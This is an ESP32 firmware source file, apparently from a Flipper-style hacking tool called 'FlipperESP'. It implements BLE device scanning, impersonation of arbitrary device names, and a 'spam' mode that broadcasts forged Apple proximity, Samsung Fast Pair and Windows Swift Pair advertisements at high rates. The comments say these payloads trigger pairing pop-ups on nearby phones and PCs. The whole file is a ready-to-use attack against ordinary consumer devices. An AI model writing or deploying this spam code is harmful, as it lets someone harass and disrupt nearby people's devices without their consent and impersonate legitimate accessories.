#include "ble_tools.h"

#if CONFIG_BT_ENABLED

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertising.h>

static BLEScan*        _bleScan = nullptr;
static BLEAdvertising* _adv     = nullptr;

// ─── Apple proximity advertisement payload ────────────────────────────────────
// Triggers "Connect to Apple device" UI on nearby iPhones/iPads
static const uint8_t APPLE_ADV_AIRPODS_PRO[] = {
    0x1E, 0xFF,             // length, manufacturer-specific
    0x4C, 0x00,             // Apple Inc.
    0x07, 0x19,             // type: proximity, length
    0x07,                   // device model (AirPods Pro)
    0x20,                   // status
    0x75, 0xAA, 0x30, 0x01, // battery / pairing data
    0x00, 0x00, 0x45, 0x12,
    0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
};

// ─── Samsung Fast Pair payload ────────────────────────────────────────────────
static const uint8_t SAMSUNG_FAST_PAIR[] = {
    0x03, 0x03,             // UUID list (2 bytes)
    0x2C, 0xFE,             // Fast Pair service UUID (0xFE2C)
    0x06, 0x16,             // service data header
    0x2C, 0xFE,             // service UUID again
    0x00, 0x40, 0x28,       // model ID bytes (generic headphone)
};

// ─── Windows Swift Pair ───────────────────────────────────────────────────────
static const uint8_t WINDOWS_SWIFT[] = {
    0x0E, 0xFF,
    0x06, 0x00,             // Microsoft
    0x03,                   // Swift Pair subtype
    0x00,
    0x80,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

bool BleTools::begin() {
    BLEDevice::init("FlipperESP");
    _bleScan = BLEDevice::getScan();
    _bleScan->setActiveScan(true);
    _bleScan->setInterval(100);
    _bleScan->setWindow(99);
    _bleReady = true;
    Serial.println("[BLE] Ready");
    return true;
}

void BleTools::scanDevices(uint32_t duration_ms) {
    if (!_bleReady) { Serial.println("[BLE] Not initialized"); return; }
    Serial.printf("[BLE] Scanning %lu ms...\n", duration_ms);

    BLEScanResults results = _bleScan->start(duration_ms / 1000, false);
    Serial.printf("[BLE] Found %d devices:\n", results.getCount());

    for (int i = 0; i < results.getCount(); i++) {
        BLEAdvertisedDevice dev = results.getDevice(i);
        Serial.printf("  [%2d] %s  RSSI:%d  Name:'%s'\n",
                      i,
                      dev.getAddress().toString().c_str(),
                      dev.getRSSI(),
                      dev.haveName() ? dev.getName().c_str() : "");
    }
    _bleScan->clearResults();
}

void BleTools::startSpam(BleSpamType type) {
    if (!_bleReady) begin();
    if (_running) stop();

    _adv = BLEDevice::getAdvertising();
    _adv->stop();

    BLEAdvertisementData advData;

    switch (type) {
        case BleSpamType::APPLE_PROXIMITY: {
            std::string payload((const char*)APPLE_ADV_AIRPODS_PRO,
                                sizeof(APPLE_ADV_AIRPODS_PRO));
            advData.addData(payload);
            Serial.println("[BLE] Starting Apple proximity spam");
            break;
        }
        case BleSpamType::SAMSUNG_FAST_PAIR: {
            std::string payload((const char*)SAMSUNG_FAST_PAIR,
                                sizeof(SAMSUNG_FAST_PAIR));
            advData.addData(payload);
            Serial.println("[BLE] Starting Samsung Fast Pair spam");
            break;
        }
        case BleSpamType::WINDOWS_SWIFT_PAIR: {
            std::string payload((const char*)WINDOWS_SWIFT, sizeof(WINDOWS_SWIFT));
            advData.addData(payload);
            Serial.println("[BLE] Starting Windows Swift Pair spam");
            break;
        }
        default:
            advData.setName("FlipperESP");
            advData.setAppearance(0x0180); // generic headphone
            Serial.println("[BLE] Starting generic advertisement");
            break;
    }

    _adv->setAdvertisementData(advData);
    _adv->setMinInterval(20);
    _adv->setMaxInterval(40);
    _adv->start();
    _running = true;
}

void BleTools::advertiseAs(const char* name) {
    if (!_bleReady) begin();
    if (_running) stop();

    BLEDevice::deinit(false);
    BLEDevice::init(name);
    _adv = BLEDevice::getAdvertising();
    _adv->setMinInterval(100);
    _adv->setMaxInterval(200);
    _adv->start();
    _running = true;
    Serial.printf("[BLE] Advertising as '%s'\n", name);
}

void BleTools::stop() {
    if (_adv) _adv->stop();
    _running = false;
    Serial.println("[BLE] Stopped");
}

#else // CONFIG_BT_ENABLED not set (ESP32-S2)

bool BleTools::begin() {
    Serial.println("[BLE] Not supported on this chip (ESP32-S2 has no BLE)");
    Serial.println("[BLE] Swap to ESP32-S3 or original ESP32 for BLE features");
    return false;
}
void BleTools::startSpam(BleSpamType)         { Serial.println("[BLE] Not available"); }
void BleTools::stop()                          {}
void BleTools::scanDevices(uint32_t)           { Serial.println("[BLE] Not available"); }
void BleTools::advertiseAs(const char*)        { Serial.println("[BLE] Not available"); }

#endif
